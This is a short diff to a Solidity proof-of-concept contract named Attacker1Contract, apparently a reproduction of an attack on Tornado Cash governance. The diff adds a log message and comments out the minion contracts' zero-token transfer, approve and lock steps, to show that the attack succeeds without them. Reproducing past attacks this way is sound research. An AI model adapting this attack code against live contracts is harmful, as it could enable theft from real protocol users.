@@ -25,6 +25,7 @@ contract Attacker1Contract {
 
     function deployMultipleContracts(uint256 amount) external {
         address newMinion;
+        console2.log("MINIONS WON'T APPROVE AND LOCK ZERO TORN");
         for (uint256 i = 0; i < amount;) {
             newMinion = address(new Attacker1Minion(msg.sender));
             console2.log("Deploying and preparing minion #%s at address: %s", i + 1, newMinion);
@@ -33,9 +34,10 @@ contract Attacker1Contract {
 
             // The following steps were performed by the attacker but are not necessary for the attack
             // The attack works if the next lines are commented.
-            tornToken.transferFrom(msg.sender, newMinion, 0);
-            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.APPROVE);
-            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.LOCK);
+            // ON THIS BRANCH WE COMMENT THIS LINES TO SHOW HOW THE ATTACK SUCCEEDS ANYWAYS
+            // tornToken.transferFrom(msg.sender, newMinion, 0);
+            // Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.APPROVE);
+            // Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.LOCK);
 
             unchecked {
                 ++i;
